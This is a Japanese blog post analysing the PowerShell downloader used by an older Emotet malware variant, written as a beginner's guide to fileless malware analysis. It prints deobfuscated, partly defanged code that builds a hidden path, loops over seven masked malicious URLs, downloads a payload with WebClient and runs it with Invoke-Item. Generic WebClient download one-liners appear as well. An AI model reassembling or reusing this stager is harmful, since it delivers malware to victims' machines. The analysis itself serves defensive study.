# Emotetを知る(oldversion)

以前にEmotetについて解析したが、それ以前のEmotetはどうだったのか？というの記録しておきたい。  

Emotetが何か？ということについては、前の記事で書いたので、是非そちらを見ていただきたい。  
[Emotetの記事](https://blog.tech-oshiba.com/2022/02/05/%e3%83%9e%e3%83%ab%e3%82%a6%e3%82%a7%e3%82%a2emotet%e3%82%92%e8%aa%bf%e3%81%b9%e3%82%8b)

で、ここで見ていきたいのはEmotetの旧バージョンとなる。  
これは、2020年末ごろに流行ったタイプであり、以下3つを特徴と考えている。  
1. powershellをダウンローダーとして利用する  
2. powershellの起動は、WMIのAPIを経由することで、macroマルウェアが親プロセスとしては起動しない  
3. calc.exeを任意の名前にコピーしてProcessHollowingを使って悪用する  

ProcessHollowingについては、恐らくわからない方もいると思うが、コードインジェクションの手法の１つだとご理解いただきたい。  
ProcessHollowingのインジェクションとしての1つの特徴としては、サスペンドモードでプロセスを起動するため、起動中のプロセスには行えない手法であり、これが行われているプロセスにおいては親プロセスが悪性であるということになる。  

で、私が見ていきたいところとして、このpowershellを使ったダウンロード操作のところになる。  
理由は、ファイルレスマルウェアであること、そしてpowershellのファイルレスマルウェアをダウンローダーとすることはごく一般的であるということにある。  
最後の理由としては、ちょっとした難読化がされているがそれがとても簡単なものになっており、最初にとっかかるのにはとてもいいと思ったことだ。  

さて、それでは見ていこう。  

## コード内容  

powershellマルウェアのコードをここにそのまま載せてしまうとまずいことになりかねないので、まずは全体像を画像で載せる。

![powershellコード全体](https://raw.githubusercontent.com/proshiba/analysis/main/emotet2/powershellcommand.png)

上に乗せたbase64でエンコードされたコマンドを、マクロマルウェアが実行する。ただし、その際にはWMIのAPIを経由してプロセス生成をする形で実行する。  
Note: wmicコマンドでいう、wmic process call create の結果と同等  

で、その内容をデコードした結果が下になっている。  
この難読化はとてもわかりやすい内容になっており、結局は文字列の分割をしているに過ぎない。それも普通に前から足して行けばなんとかなるレベルである。  

さて、それではここから見ていくが、まずは;(セミコロン)の位置で改行をして見やすくして見る。  
その際に、最初の行はいかだ。  
```powershell
$Vmpbaf3=(('P'+'er')+('e'+'wky'));
```

ここで説明してしまうのが早いが、'p'+'er'はperであり、それらを結合した後の、(Per)+(ewky)はPerewkyとなる。  
今回作成されているコマンドは全てこの調子で書かれている。  
その次に書かれている以下のコマンドはディレクトリの作成が書かれている。  
```powershell
&('new-'+'i'+'tem') $Env:usERProFILe\wYhZObX\ca1jHTV\ -itemtype DIrectOry;
```

このコマンドは以下のフォルダ作成となる。  
* %userprofile%¥wyhzobx¥ca1jhtv

なんとなく見るとわかるが、このコマンドはnew-itemというコマンドレットで、itemtypeとしてはdirectoryになっている。  
その際のフォルダ名が上のものであり、このフォルダを作ることになっている。  

さて、ここで２つほど説明を追加しておく。  
- $envについて:　$envは環境変数を指定する際のものであり、この場合は環境変数のuserprofileを参照している  
- 大文字小文字について: 大文字小文字はpowershellコマンドでは意識されない  
  なので、$Env:usERProFILeと$env:userprofileは同じもの
- &は実行演算子。その後に続く文字列を式として実行(この場合はnew-item)  

ここから先もこの点だけ理解しておけば読み進めていくことができる。  
まずは、以下の通りファイル名が定義されている。  
```powershell
$Ihsmwpx = "Myf5gg";
$tmp='MiuWyhzobxMiuCa1jhtvMiu'                     
$tmp2=($tmp).RePLacE("Miu",'\')
$Is_jn7b=$env:user[xxx]profile+$tmp2+$Ihsmwpx+'.exe'
```
Note: おかしな検知がないように一部無害化  

ここでは、MiuWyhzobxMiuCa1jhtvMiuという文字列に対して、replaceメソッドを呼んでいる。  
この、文字列のreplaceも難読化ではよくあるやり方だ。  
この変換をすると結果は以下になる。  
¥Wyhzobx¥Ca1jhtv¥

$env:userprofileはユーザホームディレクトリのため、これらを結合した結果は以下だ。  
- c:¥users¥{ユーザ名}¥Wyhzobx¥Ca1jhtv¥Myf5gg.exe

さて、これがダウンロード後のファイル名となる。  
で、この先ではpowershellのダウンロード先URLが定義されている。  

やってることは、ざっくり以下の順番である。  
1. webclientのインスタンスを生成(ダウンロード処理の前準備)  
2. URLを定義(複数あるため、配列で定義)  
3. 定義したURLをforeachで回し、ダウンロード  
4. ダウンロードしたデータサイズが27871Byte以上なら実行  

さて、まずはwebclientのインスタンス生成とURL定義について記載する。  
まずは、見やすいように整形した結果が以下である。  
```powershell
$L2v3tao=new-object net.web[xxx]client;         
$Lxm3ldw=(                                      
    "hxxp://crbremen[x]com/WordPress_01/A/",
    "hxxp://creixenti[x]com/stations/rV/",   
    "hxxp://e-brand[x]org/cgi-bin/oJ/",         
    "hxxp://earthinnovation[x]org/gcfimpact/8h/",
    "hxxp://cooptotoral[x]com/Admin/6BO/",   
    "hxxp://commeavant[x]com/Harvey_files/b/",
    "hxxp://fruehling[x]tv/arbeit/zR/"          
)                                               
# URLはマスク
```
これは、もともと以下のようになっていた。(一部省略。また改行だけは入れている。)  
```
$L2v3tao=&('ne'+'w-ob'+'jec'+'t') net.WebclieNt;
$Lxm3ldw=('h'+('t'+'tp')+':'+('/'+'/crb'+'r')+〜省略〜."S`Plit"([char]42);
```

ここでも実行演算子を入れており、内容はnew-object。インスタンスの生成であり対象クラスはnet.webclientというものだ。  
このwebclientは非常に使いやすいものであり、powershellのダウンローダでは必須レベルで使われている。多くの場合、以下の使い方だ。  

1. 文字列をダウンロード  
```powershell
(new-object net.webclient).downloadstring("URL")
```

2. データをダウンロード  
```powershell
(new-object net.webclient).downloaddata("URL")
```

3. ファイルとしてダウンロード  
```powershell
(new-object net.webclient).downloadfile("URL", "ファイル名")
```

次に、URLの定義は一旦文字列として定義後、split関数で分割している。この際に、splitで分割するための文字を[char]42としているが、これはASCIIコードで文字を定義している。  
これも難読化でよく利用される。この場合、[char]42は「*」(アスタリスク)である。この文字で分割すると上に書いたURLの配列となるわけだ。  

さあ、ここまでくるとほぼ終了であるが、最後に実際のダウンロード処理と実行操作がある。そこを見てみよう。  

```powershell
foreach($Pdh_rn7 in $Lxm3ldw){
  try{
    # 関数をマスク
    $L2v3tao.down[xxx]load[xxx]file($Pdh_rn7, $Is_jn7b);
    $Xeq9tdw="Jgn_wbs";
    If (Get-Item $Is_jn7b).LengTh -ge 27871)
      Invoke-Item $Is_jn7b;
      $N547p41="Flg7a8a";
      break;
      $J7p06nv="J5uwq52"
    }
  }catch{}
}
```

特徴的な難読化はされていないので、ここは元コードは割愛した。  
この中では今までに示してきたwebclientのdownloadfileを利用している。  
また、ダウンロードしたファイルについて、get-itemとlengthでデータサイズをチェックし、27871Byte以上なら、Invoke-Itemで実行するという流れだ。  
このInvoke-Itemは、エイリアスのiiやStart-Processを利用することもある。  

さて、これでダウンロードして実行する処理までが見れた。この先はダウンロードしたマルウェアの挙動になり、powershellはここで終了となる。  

今回のpowershellマルウェアの解析は以上です。  
初級レベルのものだと思いますが、ファイルレスマルウェアの解析を始める上でとっかかりのための情報として役に立てば幸いです。
